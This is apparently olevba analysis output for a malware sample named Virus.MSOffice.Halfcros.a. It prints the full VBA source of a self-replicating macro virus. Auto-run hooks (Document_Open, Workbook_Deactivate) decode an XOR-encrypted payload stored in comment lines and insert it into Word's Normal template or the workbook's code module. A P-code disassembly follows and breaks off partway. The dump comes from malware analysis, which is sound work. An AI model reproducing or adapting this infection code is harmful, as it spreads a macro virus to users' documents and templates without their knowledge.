olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Halfcros.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Halfcros.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Halfcros.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Halfcros.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Halfcros.a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































'
' 35
'ThisDocumentN
Private Sub Workbook_Deactivate()
If ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(40, 1) <> "'InRun" Then Call Calculate_AddressX(98, 25)
End Sub
Private Sub Document_Open()
Call Calculate_Address(83, 15)
End Sub
Private Sub Document_Close()
Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule
With Iam: .ReplaceLine 40, "": Z = .CountOflines: Done = Decode(.Lines(73, 10), 230): .InsertLines Z, Done: Mail_Item: .DeleteLines Z, 10: .ReplaceLine Z, "End Sub": End With
Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Comp2 = Iam.Lines(41, 1): NormalTemplate.Saved = True:
CH = Word.ActiveDocument.Characters.Count: Comp = "'" + Str(CH): t = Iam.Lines(42, 1): If t = "" Then Exit Sub
If Comp = Comp2 And t <> "'ThisDocumentA" Then Iam.ReplaceLine 42, "'ThisDocument" & Right$(t, 1): ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument: Exit Sub
If Comp = Comp2 And t = "'ThisDocumentA" Then ActiveDocument.Saved = True: Exit Sub Else: If t <> "'ThisDocumentA" Then Iam.ReplaceLine 42, "'ThisDocument" & t
End Sub
Private Function Calculate_AddressX(Start_Encode As Integer, Code_Lines As Integer)
Set Work_Book = ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule
With Work_Book: Z = .CountOflines: Done = Decode(.Lines(Start_Encode, Code_Lines), 230): .InsertLines Z, Done: Mail_Item: .DeleteLines Z, Code_Lines: .ReplaceLine Z, "End Sub": End With
End Function
Private Function Calculate_Address(Start_Encode As Integer, Code_Lines As Integer)
On Error Resume Next: CH = Word.ActiveDocument.Characters.Count: Comp = "'" + Str(CH)
WhereAmI = Right$(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(42, 1), 1)
If WhereAmI = "N" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: Z = .CountOflines: Done = Decode(.Lines(Start_Encode, Code_Lines), 230): .InsertLines Z, Done: Mail_Item: .DeleteLines Z, Code_Lines: .ReplaceLine Z, "End Sub": End With: NormalTemplate.Save
ActiveDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 41, Comp: End Function
Private Function Decode(s, k As Integer)
Dim r: r = "": For F = 1 To Len(s): A = (Mid$(s, F, 1)): If A = Chr(13) Or A = Chr(10) Then r = r + A: GoTo Over
If A = "'" Then A = "": r = r + A: GoTo Over
r = r + Chr((Asc(Mid$(s, F, 1))) Xor k): k = k + 2: If k = 250 Then k = 230
Over: Next F: Decode = r
End Function
'©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒÜÈ¹‰šÐŠ˜·ˆ–È×Ì­‚—•‚�©Š€‰�„ÚÖ³€…�†Â¯€‚˜Ÿ›‡œƒƒ€ÒÛ
'½�Ø³«‹Ÿ‹Ø¶�„Ðž„«œžÞ³„†”�‹‹˜‡ŸœÚ¥Œ‡šž™ž “€žØÍÈÈ°¬Ÿ�ŸÇÖÄÁÃÌÒÎÒ¡µ™•�ÂÎ¬¿½¿ÇÚÏÈ¾„‹ž
'¡�…Œƒ…Ä¼œ™„•‚�¶š…Š‡œ—§‚Š�†�ÄÌÒÞÔÔ°­­³³­¥ ¦³¶²·¿¿«¢®§™ž’Ÿ‹ž‹¬¿�•Š‰›…Šš¬½’�‘…�¶ÔÀÀ®±Ž›ƒ„¶¡‡“€›…—€œÊ©–“—˜ÔÔÆÊ¥œš™�š…ÎÄÁÊÑÎÒÐ
'§�‹’�‡Â¾‚›‚—Œƒ¸˜ƒˆ™ž‘¥Œ”�„‹ÆÒÐØÖÚ®£¯µ±¼½··´¹¥«¯¦¹¼±ª«‰Žž›�‚—¨»‘…š…Ÿ�–†¨¹ž€�‰‰²ÈÜÄª¶ƒŸÊ¹�•€Ô¥�’œƒ‚‰ƒ®±Ž›ƒ„¶¡‡“€›…—€œÊ©–“—˜ÔÔÆÊ¥œš™�š…ÎÄÁÊÑÎÒÐ
'Œš¹–˜Ä»�‚™–™—�›Ä­Š”Ü§—Žƒ©™Ì–œ³„†Ö§˜š€‡““€Ÿ—ˆÆ¹˜�‚†�†¨‡œ‚ÌÈÐÐ¨´—‰ƒÛÂÌ
'£—€Ö±‡…ÊÑÎ¾�†›™Š¼��žœ“€“Ö°ªºž�š——‚Ö°ª©ƒƒ€�š“–’›ÂÝÇÞ±›’�«‡Ž™‚•ÈÔ¥�’È¯”�•žÔËØž„«œžÞ¥›„“„‡…‡�ØÐ¶™—�ÙÄÎÇÞ¤¶¦Š‰‚��šÞ¤¶µ—‹˜…‚‹ž†‡Ø±’�‡ÄÌ¤š�…¯‰š�Ž�Ÿ™ÖßÖ¥‡Ž‰£Ÿ–�š�
'±�ž„ÎµŠ—“”ÜÈ¼…œ³��“ØÛÈ£�ƒÞ¾�˜�•ÀÛÀÎ¹“™Ø»‰�„˜¡–¾�˜�•ÈÇÌßÀÛÎÖÖ¯†™‰œ„¾�˜�•ÈÛÀÎ¦›†µ—‚�ÐÌÀ¢—„š™…�†…€•ÒÜ¿™‹Æ©ƒ›ž†»�´�†�ŸÎÝÒÅÆÑÊÈÈ©€”Ò§ƒšÄÒÊ©€”Ò£ŸŒŽ
'�†­ž€Ü£™Š�Š…ƒ…ƒÚÖ´—‰ƒÛÂÌÙÜ·š—•�Ê¿�†—·ž™ˆ��ŸÔÍ¦†ƒ�
'ž„«œžÞ³„†”�‹‹˜‡ŸœÚ§��œ
'¯‚ŠÐ»’
'©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒÜÈ¥œš™�š…Öµ‰œ‰ Ÿ€™—”¶š…�ž„ÒÉÖ¾‡„™‰ÔÐ½„‚‘‰†™Â¸™€�…¨”‡ž‰�„››˜ØÛÈ¬�‚ƒ—
'§“ŒÆ©‰˜­‘€†Ÿ�”È×Ì¯“†�€�¢‡‰™ƒ•œ€Ø®¤¸˜ƒ„•‘€Ø®¤«…�žŸœ‘˜Œ•ÀÛÅÀ³��“µ‰ŒŸ€‹ÊÒ½�Ø®‡ŸžÆ¾�ƒßØÛÈÛÞÎ±œ�Öµ�†Ÿ˜‹Ø¼›�ÑÆÖÊÝÞÐ³š’Ø«�„™š•Úº™�ÏÈÖÌÜÅÒ ž�ˆÈ§Ÿ‰²�ŒÖÚ¯œ™Ìš™Ÿ‘Öž‰šÊ€›ž‘œÖÚÆÎÊ­ž€ž�•™’�…‚À¥�‘„¶‡…�ÀÎÀÞÔÔ¯‰†Ž‰œÐ„ÆØÈÆŠ“Ìº˜·Ô�½�ºŽÌ©•¼�£‹Ä
'»�˜Î¾�†›»‡š˜…‹‚ÒÉÖ¶‰š‡�‚¤—™†”‡œ�Â¸²¢†™’ƒ‹žÂ¸²±››ˆ‰†�‚šƒÚÅßÖ¥‡Ž‰£Ÿ–�š�
'¨¡ÊÑÎ¾�†›™Š¼��žœ“€“Ö°ªºž�š——‚Ö°ª©ƒƒ€�š“–’›ÂÝÇÞ±›’�«‡Ž™‚•Ü¸Ÿ–ƒ›ÂØÜÜÒÅß
'¹¯È×Ì¯“†�€�¢‡‰™ƒ•œ€Ø®¤¸˜ƒ„•‘€Ø®¤«…�žŸœ‘˜Œ•ÀÛÅÀ³��“µ‰ŒŸ€‹Þ¾�˜�•ÀÞÞÂÐÃÝ
'¿žÆºƒ‹†„ÖÜ¸±ÊÈÓÅÎÍÒÖ²—…�‡‰€„¼ÖÖ¬Ž�„Ì Ÿ€™¿–•œ‹€‚•–ÔËØ²šŸ‰Îµž‡“Ø¨‡˜�§ž�€—”Š�ŽÌÓÐ´•š‹ƒ
'¡ŒÌ¼™•œ‚ÜÎ¦£ÀÎÉÛÔÊÆÆÊ®ƒ�…Ÿ‘˜Œ¨ÊÊ­€”Òº™Š‹«‹žœ™—†Ø»‰�„˜¡–¾�˜�•ÈÖÒÎÀÒ ž�ˆÈ¯”‡„Ò§ƒš
'¯ŽÊ¾‡—š€ÒÐ§¡ÆÌ×ÙÒÉÖÚ¢‡‰™ƒ•œ€·ÚÆ¼‚‰€Ð³—‚±ˆ›ž�‚œ—�ÖÅÆ¼˜™‹Ð·˜…�Æ©‰˜§ž�€—”Š�ŽÌÓÐ´•š‹ƒ
'¡ŒÌ¼™•œ‚ÜÎ©£ÀÎÉÛÔÊÆÆÊ®ƒ�…Ÿ‘˜Œ§ÊÊ­€”Òµ•Œ¥‰˜ž‡•€Úµ—“†ž£ˆ¼›š“‹ÆÔÔÌÞÐ¦œ“–Æ­’…šÐ¡�”
'±€È¤ƒœ�»š…Œ‡„†‰ŠÐÏÔ¢Š“�Ê­€”Òµ•Œ¯†™˜�œž‘’ØÛÈ¾ž›•Ò ž�ˆÈ¯”‡„Ò§ƒš
'¯ŽÊ¢�‚Ÿ½˜‹’‰†€‹”ÒÉÖ¾‡„™‰Î¤š‘˜ÂÆ»�˜Î¹œ’“›’�…‚ÎÍÒº™Š‹«‹žœ™—†ÌØµ�žÌ­‘€†Ÿ�”È×Ì¯“†·—Š”��žÔÐ·˜…�ÜÈ¹‰šÐ»š��…œƒƒ€ÐÏÔ·›’«‹žœ™—†ÌØµ�žÌ­‘€†Ÿ�”È×Ì Ÿ€™µ™”šƒ‰œ
'§›€žØ¥‰˜ž‡•€ÎÖ¢ÆÕÊÄÀ³��˜Œ©Ž¦…€•�ÔÛØ×ÝÃÖÎ¦›†µ—‚�ÊÑÎÞ¾�˜�•ÀÛÀÎªÛÎÖ½ˆŒÊ»‡„šÎÖ¹ÆÕÊ¶ÎÝÒÅÃ
'¯�œ‚Ì§ž”‘•Œ�‡„ÖÎÞ»š…�”œ¦…€•�ÔÇÔÆ¾ƒž­Ÿ–‘ÌØÈº�œ‚‘‘‘º‘ˆ�Ê¶ÂÐÐ±˜œÆ»ŸŽÌ
'¹”Ô¸—”…£‚�„“˜š�‚È×Ì¨‘ž‡“Ø²€�‚ÎÞ ‘†”‡‹� ‡ž—ÔÂÊÊÈ©„œØÁÍßØÍÈÈ¸†™�°™›“…�‚š¾ÐÔ³”•�ÐÌÀ¢—„š™…�¦…€•ÒÀÄÔÆ«‚žÆÃËÝÖÓÆÊ«Î
'«ž–Ô¡‘’€
'©†Ê©œ‚�†Öªƒ›Ÿ�‹Ð¼‘ŽŒ
'µ�žÌ«¨ÒÉÖ¬Ž�™»�‚™–™—�Æ¼®¾‚�ž“›’Æ¼®­ŸŸ„™–ƒ†žŸÀ¹†‘›ÐÄ¼‚…�§�†�š‰‡�ÎÇÞ±›’�«‡Ž™‚•
'»’Ö­¥‰™‰Æ´›†Þ¹–˜†…�‘†�™–È»ž�œ„‡„¦™’€ÊÇÎÒ®¶™—�ÙÄÎÇÙÒÈÈØÄª¥£¥ÁÐÔ·–‚È¸…‰˜†ÐÞ½¾Æ¦…€•�ÜÂÈÊÈÛÅÂÐÇÝÖÄØÈÈ¥€¢‡šÔØ²€�‚
'«¨Ü¦“ˆŠ‰‰‰¢™œ‘ÖÌÖÄÊ¯†‚ÚÇÏÑÆÃÊÎ§ž �˜ÚÜÈ¹‰šÐ¥›„œ©Š€ÌÓÐµ‘‚·„‚��šØÞÔÔ¯‰šŽÂ¯€‚˜Ÿ›‡œƒƒ€ÒÛÎÖ±€È½ƒœ”½–œØÚÖÊÎÌÐ¦œ“–Æ¯…¸�Ð£�ŸŒ¹¼‚…�
'£—€Ö¯‰šŽ£ŒšÒÉÖ»”�‹˜‹¿�ž“›’ÀÈ»�‚–Ú·ˆ–„ƒ��„››˜ÚÏÒÊ¿‹„Òº¢ØÛÈ½ƒœ”½–œÖ¨‡˜��œ¦‘›ˆŠ‰ž‰À¦°¤„—Œ�‰˜À¦°·™•–‡„‰€„�ÜÔ¬Ž�™¨�“‡™“–’ÊÃÂ­Ÿ–‘»—‚�†‰
'§–Ò¦ŸŸŽœÎÄ ¤Ü¸Ÿ–ƒ›ÂØÜÜÒÅßÔÆÙÙÅÎÌÌÔÔ¬Ž�™¨�“‡™“–’¦ÈÌº˜—š
'¡—”Œ¥Ž„Þ½„‚‘‰†™Â½‘„‘¸—”…‹€¾‚�™†ŒÆÕÊª�œ�‘Ì
'¶²Æ®‰‚•†‘º‘ˆ�™ÌßÜÒº¢Ö¥‡Ÿ‚š¿”˜Ÿ–ƒ›ÐÌ ¤Ü½˜‹ƒšž ‡ž—‡ÖÉÊÈÈ¼›’ž�•Øµ�ˆÌª™�•””ƒ©¼ÄÇÒÈÔ¸¬È¡„Ÿ‹‚†¸Ÿ–ƒ›ÊÞÂÐÐ»†Œ�‡„ŸÀ¦›†ƒ‹¶š…˜‹“†�™–ÆÕÊª�œ�‘ÌÚÜ
'¦¾Â§ž�‘„Œª�„‰�ÐÁØÖÚµ‘™˜‹�Ü¤„‘�‰ž‰¾‚�’Ÿ”ƒ»žž‡ž•ÜÔÚÄÊÆÌÌÒº¿³¡¹«¿¾¼µ¼ ©­µ­¸°½Ÿ”€�™”�¶¡‡“€›…—€œ¶£ˆ–›—“¤ÞÆÚ°«ˆ‘‘š¤«�‰ž�ƒ�’‚Ø£�‰‰‚ÒÐØÖÚÄ§š˜‡Ÿœ‡ÀÚÄÁÊÑÎÒÐÖÔÚ
'¨¼Ä¥€ƒ—†‚´�†�ŸÎÄÞÔÔ«Ÿ›ž‰ƒÞ¢†ŸŽ‡œ�¼œŸ”�š�µœ˜…€—ÚÖÔÚÄÄÊÎÌ¸¹±¯§ª§©­¢¯¿µµ°¯¦¯°½Ÿ”€�™”�¶¡‡“€›…—€œ¶£ˆ–›—“¤ÞÆÚ° •…Ô£‹ƒšÊ¿‹„†�˜Ÿ•´¯”�•ž¨»‘…š…Ÿ�–†Ô³€…�†ÎÌÜÒÖÔ·–œƒƒ€ƒÄÖÔÑÆÕÊÎÌÒÐÖ
'¸¬È¡„Ÿ‹‚†¸Ÿ–ƒ›ÊÙÂÐÐ±˜œÆ»ŸŽÌÊÒ£™Š‚§ˆ†À¢‡šÖÚ¨‡˜��œÜ ž‘•¬…�›�—š‚Ö¢�™�Œœ—µ ÚÜ
'¦¾Âª•ž‘‚�ª�„‰�ÐÃØÖ¶²Æ©ƒ›ž†»�”�†�Ÿ
'¸™€·™œƒÈ×Ì«¨Ü¸Ÿ–ƒ›ÂÝÂÐ·¬Ø»‰�„˜¡–ž�˜�•ÈÇÌÜÅÛÎÖ¶²Æ£‚�•€€º‘ˆ�™ÌßÜÒ¢ŸŠ¥‡Ž‰Ô
'¾¦Ú¤�–„‹�‹¼›š“ØÎ¦¾Â­Ÿ‡š‚·€„ƒ‚‹ƒÛØÖÚ£†ŽÌ½…�ÖÌØµ�žÌ ¤ÒÉÖ¶‰œ‚…€—È
'£™Š�Š…ƒ…ƒÜµ’œÈ»‹š‹±�Ô°‘Š�¤�ƒ•ÈÉ·ˆ–„ƒ��„››˜Öµœ‹žš…‚¤—ŒŽÈÌÌÌ¬°›™“×ÆÈÀÎ¶›˜“¾‰š‡�šÊÏŒš¶‰š‡�‚ÜÒµ’œ²‡§ž›ÊÏ²—”•�
'¹‰šÐ³£ÖÅÆ¼‚…�§�†�š‰‡�Â¸²¢†™’ƒ‹žÂ¸²±››ˆ‰†�‚šƒÜ½‚�‹ÀÈ¸†™�£™Š�Š…ƒ…ÒÛÚµ—‚�§ƒŠ…ž‘
'¥�’È£»ÎÍÒ£™Š�Š…ƒ…ƒÚÖ´—‰ƒÛÂÌÙÜ¢´¨”‡€‰�„Ü¢´»‰…šƒ€•œ€…Ö¯œ��ÆÒ¦œŸ‹±‡˜‡ŒŸ�ŸÔÑÈ«…ˆ‹½��ƒ”ƒ
'¡ŒÌ¼™•œ‚ÜÎ¡½Â¢™œ‘…ÐÒÚÆÌßÙÞÔÇËÏÈÖÒÎÒ¦œŸ‹¢‡‰™ƒ•œ€¸ÚÆ¼‚‰€Ð¤�„»‰Œ�ÌÓÐ³£Ø´�†�ŸÆÁÞÔ·¯È«…™€„½’š‘ˆ�™ÌÃÐÀÁßÂÆ¡½Â§ž�‘„Œª�„‰�ÐÃØÖ®�š©ƒŠ•ÈÔ¿¯Èº�œ‚‘‘‘º‘ˆ�Ê¥¹Þ±›ƒ–’§Œ€‡ž—‡ÚØÄ­„ˆÎ£‡–ÔÂÆ¡½Â¼•‚˜—›ƒ¤ƒ‚‹ÐÆÄÚØÄÊ
'½ƒœ›�›™“•ÀÈ®�Ÿ™ÅØÚÏÆ©€�ƒ—Ô¥™��©„�ž•‘…ÂÛ¼˜™‹
'µœ�Ö±€ÒÊ»�‚–»”’È¹Ÿ…šÊ
'£�ŸŒ¹¼‚…�Ê
'·š’Ø¯ŽÐÌ½•†Ô·¯ÆÕÊ¸†™�£™Š�Š…ƒ…Þ¤¶¦Š‰‚��šÞ¤¶µ—‹˜…‚‹ž†‡Ø±’�‡ÄÌ¤š�…¯‰š�Ž�Ÿ™ÖßÖ¥‡Ž‰£Ÿ–�š�ÜÈ¬ƒœÐ›ÔËØ×È¾ƒÎ§�†�š‰‡�ŸÀ³��˜Œ
'µ�žÌ§§ÒÉÖ¯‰š�Ž�Ÿ™‡Þ‘ÏÆ¼®¾‚�ž“›’Æ¼®­ŸŸ„™–ƒ†žŸÀ¹†‘›ÐÄ¼‚…�§�†�š‰‡�ÎÇÞ±›’�«‡Ž™‚•
'»’Öª��‚˜ÊØ»£Ø´�†�ŸÆÄÀØÖÉÏÄÊÝÝÙÒÈÈØÄ¼‚…�´�—ƒ•ƒ†ž¢ÌÐ¦œ“–Æ¾ƒž­Ÿ–‘ÖÅÆ©½Â¢™œ‘…Ð×ÄÊ­¹Þ±›ƒ–’§Œ€‡ž—‡ÖÕÆÚßÅÔÐ»£Ø±ˆ›�žš¼›š“‹ÆÙÆÌ¸™€·™œƒÒÊ¥¹Þ ‘†”‡‹� ‡ž—Ô¿¯È«…™€„½’š‘ˆ�™ÀÎÒ·š’Øµ�ˆÎÔÐ»£Øªƒ˜†��•¾�˜�ÆÜÚÀÎÒÐ
'º“€’ÒÊ­¹Þ ‘†”‡‹� ‡ž—ÔÂÈÊÈ©„œØÁÍßÂÆ¿…ž…’�›�‹ÎÊ¨ƒ�›ÃÖßÖµ‰œ‰ŠÐÏÔ¢Š“�
Private Sub Mail_Item()
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Halfcros.a
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 28743 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x0000 ""
' Line #40:
' 	QuoteRem 0x0000 0x0003 " 35"
' Line #41:
' 	QuoteRem 0x0000 0x000D "ThisDocumentN"
' Line #42:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #43:
' 	LitDI2 0x0028 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'InRun"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0062 
' 	LitDI2 0x0019 
' 	ArgsCall (Call) Calculate_AddressX 0x0002 
' 	EndIf 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Private Sub Document_Open())
' Line #46:
' 	LitDI2 0x0053 
' 	LitDI2 0x000F 
' 	ArgsCall (Call) Calculate_Address 0x0002 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Private Sub Document_Close())
' Line #49:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' Line #50:
' 	StartWithExpr 
' 	Ld Iam 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0028 
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	MemLdWith CountOflines 
' 	St Z 
' 	BoS 0x0000 
' 	LitDI2 0x0049 
' 	LitDI2 0x000A 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x00E6 
' 	ArgsLd Decode 0x0002 
' 	St Done 
' 	BoS 0x0000 
' 	Ld Z 
' 	Ld Done 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	ArgsCall Mail_Item 0x0000 
' 	BoS 0x0000 
' 	Ld Z 
' 	LitDI2 0x000A 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Z 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	BoS 0x0000 
' 	LitDI2 0x0029 
' 	LitDI2 0x0001 
' 	Ld Iam 
' 	ArgsMemLd Lines 0x0002 
' 	St Comp2 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' 	BoS 0x0000 
' Line #52:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	St CH 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	Ld CH 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St Comp 
' 	BoS 0x0000 
' 	LitDI2 0x002A 
' 	LitDI2 0x0001 
' 	Ld Iam 
' 	ArgsMemLd Lines 0x0002 
' 	St t 
' 	BoS 0x0000 
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #53:
' 	Ld Comp 
' 	Ld Comp2 
' 	Eq 
' 	Ld t 
' 	LitStr 0x000E "'ThisDocumentA"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x002A 
' 	LitStr 0x000D "'ThisDocument"
' 	Ld t 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	Concat 
' 	Ld Iam 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #54:
' 	Ld Comp 
' 	Ld Comp2 
' 	Eq 
' 	Ld t 
' 	LitStr 0x000E "'ThisDocumentA"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	ExitSub 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	Ld t 
' 	LitStr 0x000E "'ThisDocumentA"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x002A 
' 	LitStr 0x000D "'ThisDocument"
' 	Ld t 
' 	Concat 
' 	Ld Iam 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' 	EndIf 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Private Function Calculate_AddressX(Start_Encode As Integer, Code_Lines As Integer, id_FFFE As Variant))
' Line #57:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Work_Book 
' Line #58:
' 	StartWithExpr 
' 	Ld Work_Book 
' 	With 
' 	BoS 0x0000 
' 	MemLdWith CountOflines 
' 	St Z 
' 	BoS 0x0000 
' 	Ld Start_Encode 
' 	Ld Code_Lines 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x00E6 
' 	ArgsLd Decode 0x0002 
' 	St Done 
' 	BoS 0x0000 
' 	Ld Z 
' 	Ld Done 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	ArgsCall Mail_Item 0x0000 
' 	BoS 0x0000 
' 	Ld Z 
' 	Ld Code_Lines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Z 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' Line #59:
' 	EndFunc 
' Line #60:
' 	FuncDefn (Private Function Calculate_Address(Start_Encode As Integer, Code_Lines As Integer, id_FFFE As Variant))
' Line #61:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	St CH 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	Ld CH 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St Comp 
' Line #62:
' 	LitDI2 0x002A 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	St WhereAmI 
' Line #63:
' 	Ld WhereAmI 
' 	LitStr 0x0001 "N"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	EndIf 
' Line #64:
' 	StartWithExpr 
' 	Ld Iam 
' 	With 
' 	BoS 0x0000 
' 	MemLdWith CountOflines 
' 	St Z 
' 	BoS 0x0000 
' 	Ld Start_Encode 
' 	Ld Code_Lines 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x00E6 
' 	ArgsLd Decode 0x0002 
' 	St Done 
' 	BoS 0x0000 
' 	Ld Z 
' 	Ld Done 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	ArgsCall Mail_Item 0x0000 
' 	BoS 0x0000 
' 	Ld Z 
' 	Ld Code_Lines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Z 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	LitDI2 0x0029 
